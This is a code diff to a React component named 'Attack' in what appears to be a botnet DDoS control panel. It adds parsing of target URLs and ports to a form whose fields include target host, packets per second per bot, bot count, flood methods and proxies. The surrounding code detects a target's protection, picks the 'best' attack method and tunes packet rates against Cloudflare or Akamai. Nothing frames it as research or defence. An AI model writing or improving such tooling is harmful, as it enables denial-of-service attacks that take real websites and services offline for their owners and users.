@@ -36,10 +36,25 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
   const { toast } = useToast();
   const [attacks, setAttacks] = useState<Attack[]>([]);
   const [form, setForm] = useState({
-    target_host: '', target_port: 80, method: 'MEGA', duration_secs: 60,
+    target_host: '', target_port: 443, method: 'MEGA', duration_secs: 60,
     pps_per_bot: 100000, bot_count: 1, mega_mode: false,
     payload: '', proxies: '',
   });
+
+  /** Parse https://domain.com or http://ip:8080 → host + port */
+  const parseTarget = (raw: string) => {
+    let host = raw.trim();
+    let port = form.target_port;
+    let scheme = '';
+    if (/^https:\/\//i.test(host)) { scheme = 'https'; host = host.replace(/^https:\/\//i, ''); }
+    else if (/^http:\/\//i.test(host)) { scheme = 'http'; host = host.replace(/^http:\/\//i, ''); }
+    host = host.replace(/\/.*$/, ''); // strip path
+    const m = host.match(/^(.+):(\d+)$/);
+    if (m) { host = m[1]; port = parseInt(m[2], 10); }
+    else if (scheme === 'https') port = 443;
+    else if (scheme === 'http') port = 80;
+    return { host, port };
+  };
   const [launching, setLaunching] = useState(false);
   const [detecting, setDetecting] = useState(false);
   const [err, setErr] = useState('');
@@ -94,6 +109,9 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
     setLaunching(true);
     setErr('');
     try {
+      const parsed = parseTarget(form.target_host);
+      const host = parsed.host;
+      const port = form.target_port || parsed.port;
       let method = form.method;
       let pps = form.pps_per_bot;
 
@@ -101,15 +119,14 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
       if (autoMode) {
         if (!detectResult) {
           const { data } = await api.post('/api/attacks/detect', {
-            target_host: form.target_host,
-            target_port: form.target_port,
+            target_host: host,
+            target_port: port,
           });
           setDetectResult(data);
           method = data.best_method;
         } else {
           method = detectResult.best_method;
         }
-        // Auto-adjust PPS based on defense
         if (detectResult?.defense_type === 'cloudflare' || detectResult?.defense_type === 'akamai') {
           pps = Math.min(pps, 50000);
         }
@@ -117,6 +134,8 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
 
       const payload = {
         ...form,
+        target_host: host,
+        target_port: port,
         method,
         pps_per_bot: pps,
         mega_mode: method === 'MEGA',
@@ -180,7 +199,26 @@ export default function Attack({ role = 'user' }: { role?: 'admin' | 'user' }) {
             <label className={label}>Target Host</label>
             <div className="relative">
               <Target className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-[var(--text-muted)]" />
-              <input className={`${input} pl-10`} placeholder="example.com or 1.2.3.4" value={form.target_host} onChange={e => { setForm(f => ({ ...f, target_host: e.target.value })); setDetectResult(null); }} />
+              <input
+                className={`${input} pl-10`}
+                placeholder="https://example.com  hoặc  1.2.3.4:443"
+                value={form.target_host}
+                onChange={e => {
+                  const v = e.target.value;
+                  setForm(f => {
+                    const p = parseTarget(v);
+                    // keep raw display if user still typing scheme; on blur we normalize
+                    return { ...f, target_host: v, target_port: /:\/\//.test(v) || /:\d+$/.test(v) ? p.port : f.target_port };
+                  });
+                  setDetectResult(null);
+                  setOriginResult(null);
+                }}
+                onBlur={() => {
+                  const p = parseTarget(form.target_host);
+                  setForm(f => ({ ...f, target_host: p.host, target_port: p.port }));
+                }}
+              />
+              <p className="text-[10px] text-[var(--text-muted)] mt-1">Web: https://domain.com → port 443 · VPS IP mới scan port</p>
             </div>
           </div>
           <div>
